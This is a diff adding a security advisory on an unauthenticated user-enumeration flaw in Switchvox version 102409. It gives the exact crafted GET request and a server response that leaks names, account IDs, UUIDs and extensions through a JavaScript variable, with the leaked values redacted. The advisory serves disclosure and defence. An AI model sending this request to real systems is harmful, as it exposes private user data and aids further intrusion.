@@ -1,0 +1,196 @@
+Switchvox Version 102409 - Sensitive Information Disclosure - Unauthenticated User Enumeration
+-----------------------------------------------------------------------------------------------
+
+Type
+----
+Remote Unauthenticated Attack
+
+
+
+Description
+-----------
+We have identified that the Switchvox (Version 102409) is affected by an information disclosure vulnerability due to an improper access restriction. We have managed to extract users information such as first name, last name, acount id, server uuid, email address, profile image, number, timestamps, etc by sending unauthenticated HTTP GET request to the "https://Switchvox-IP/main?cmd=invalid_browser". 
+
+The URL was crafted by analyzing the "https://Switchvox-IP/javascript/common/switchvox/util/browserChecker.js?v=102409" JS file's source code. 
+
+The server replies to the unauthenticated request with an "Error Encountered" Web Page for the user "undefined".
+
+The sensitive information is stored in a JS variable named "qJSON" in the web page's source code.
+
+
+
+
+Impact
+------
+An unauthenticated, remote attacker can exploit this, by specially crafted HTTP request, to disclose sensitive information which may aid in further attacks.
+
+
+
+
+Evidence
+--------
+Request:
+GET /main?cmd=invalid_browser HTTP/1.1
+Host: 10.1.11.100
+User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:94.0) Gecko/20100101 Firefox/94.0
+Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8
+Accept-Language: en-US,en;q=0.5
+Accept-Encoding: gzip, deflate
+Connection: close
+Cookie: lang_locale=en_us
+Upgrade-Insecure-Requests: 1
+Sec-Fetch-Dest: document
+Sec-Fetch-Mode: navigate
+Sec-Fetch-Site: none
+Sec-Fetch-User: ?1
+Cache-Control: max-age=0
+
+
+Response:
+HTTP/1.1 200 OK
+Server: nginx
+Date: Wed, 08 Dec 2021 10:36:45 GMT
+Content-Type: text/html; charset=UTF-8
+Connection: close
+Strict-Transport-Security: max-age=2592000; includeSubDomains; preload; always
+Content-Length: 101970
+
+
+<!DOCTYPE html>
+<!--START main/incl_header.html -->
+
+<html xmlns="http://www.w3.org/1999/xhtml" lang="en" xml:lang="en" >
+<head>
+	<meta http-equiv="Content-Type" content="text/html; charset=UTF-8" />
+
+	<script type="text/javascript" src="/javascript/common/prototype_1_7_rc2_08102010.js?v=102409"></script>
+<script type="text/javascript">
+	var gPageTitleOverride = "Main";
+</script>
+	<link rel="stylesheet" type="text/css" href="/css/common/master.css?v=102409"/>
+
+
+
+<link rel="stylesheet" type="text/css" href="/css/common/brand/brand.css?v=102409"/>
+
+
+
+	<title></title>
+</head>
+
+<body > 
+	<div id="master_container">
+	<div id="alignment_container">
+		<div class="stack">
+			<div class="notifications"></div>
+			<div id="mainNav"></div>
+			<div class="popups">
+				<div id="main_pwm_container"></div>
+				<div id="modalManager_container"></div>
+			</div>
+		</div>		
+
+		<div id="page_title" class="page_title">
+                <div id="page_title_shine" class="shine"></div>
+                <div id="page_title_text" class="title">&nbsp;</div>
+                <div id="header_help" class="header_help" style="display: none">
+				
+                </div>
+                <div class="clear"></div>
+                <div id="page_tabs"></div>
+            <div class="bottom"></div>
+        </div>
+
+		<div id="content_container">
+			<div id="content">
+               
+                    <div class="icon svicon_16px error float_left" style="margin-right: 5px;"></div>
+                    <div class="red float_left" style="max-width: 920px;">Undefined subroutine &Main::Edition::SwitchboardHandler::invalid_browser called at /usr/local/share/perl5/Kronos/HandlerObject.pm line 2.
+ </div>
+                    <div class="clear"></div><br/>
+                
+
+                
+
+
+<!--END main/incl_header.html -->
+
+<!--START main/error.html -->
+<br/>
+You have encountered an internal error with the administration suite.  Please click the "Report this Error" button below to send this error and information to assist in fixing this in the future or click the "Ignore this Error" to return to the main menu without reporting this error.
+<br/>
+<br/>
+<br/>
+<div id="page_content"></div>
+
+<!--START main/incl_footer.html -->
+		</div>	<!-- #content -->
+	</div>	<!-- #content_container -->
+	<div id="content_end"></div>
+
+    <div id="footer">
+        <span id="copyright_year"></span> <a id="company_link" ><span id="company_name"></span></a>
+    </div>
+
+	
+	</div>	<!-- #alignment_container -->
+	<div id="footer_highlight"></div>
+<!-- closing content div -->
+</div>	<!-- #master_contianer -->
+
+<script type="text/javascript">
+	var gJSON = ( {"failover_backup":"0","dateTime":{"calendar_js_input_format":"%m/%d/%Y","current_server_time":"xx:xx","current_server_meridiem":"pm","date_js_parse_format":"M/d/yyyy","date_today":"xx/x/xxxx","date_yesterday":"xx/x/xxxx"},"user_info":{"account_id_uuid":"^xxxxxxxx-xxxx-xxxx-xxxx-xxxxxxxxxxd"},"standardVars":{"edition_name":"xxxx xxxxx","edition":"xxxxxx","page_title":"Main"},"google_analytics_id":"UA-xxxxxxx-x","extensions":{"all":[{"number":"*xx","status":"1","date_created":"xxxx-xx-xx xx:xx:xx","type_display":"Feature Code","account_id":"xxxx","display":"xxxxx xxxxx","type":"xxxxxxxxx","server_uuid":"xxxxxxxx-xxxx-xxxx-xxxx-xxxxxxxxxxxx"}......................
+....................................
+....................................
+....................................} );
+</script>
+
+
+<script type="text/javascript" src="/javascript/common/full-min.js?v=102409"></script>
+
+
+<script type="text/javascript" src="/javascript/common.min.js"></script>
+<!-- 6.0 I want to move everything into this jazz /fourlop/base/ui/webadmin_ui -->
+<script type="text/javascript" src="/javascript/all.min.js?v=102409"></script>
+
+
+<script type="text/javascript" src="/javascript/common/datejs/date-en-US.js?v=102409"></script>
+<script type="text/javascript" src="/javascript/common/switchvox/lang/lang_keys-en_us.js?v=102409"></script>
+<script type="text/javascript" src="/javascript/common/switchvox/lang/lang_keys-en_us.js?v=102409"></script>
+<script type="text/javascript" src="/javascript/common/brand/brand.js?v=102409"></script>
+
+
+<script type="text/javascript" src="/javascript/common/switchvox/pages/main/error.js?v=102409"></script>
+
+<script type="text/javascript" src="/javascript/common/switchvox/lang/main/en_us/error.js?v=102409"></script>
+
+<script type="text/javascript" src="/javascript/common/switchvox/lang/main/en_us/error.js?v=102409"></script>
+
+
+<script type="text/javascript" src="/javascript/common/switchvox/pages/common/myPresence.js"></script>
+<script type="text/javascript">
+Event.observe(window, 'load', function ()
+{
+	try {
+		//- This setups the menu, notifications, and other common page routines
+		var notifications = ( gJSON.notifications ) ? gJSON.notifications : [];
+		switchvox.pages.common.footer.initMain({'notifications' : notifications});
+	} catch(e) {
+		$D("Error in the javascript footer");	
+		$D(e);
+	}
+});
+</script>
+
+
+
+</body>
+</html>
+<!--END main/incl_footer.html -->
+
+
+
+
+
+
+ 
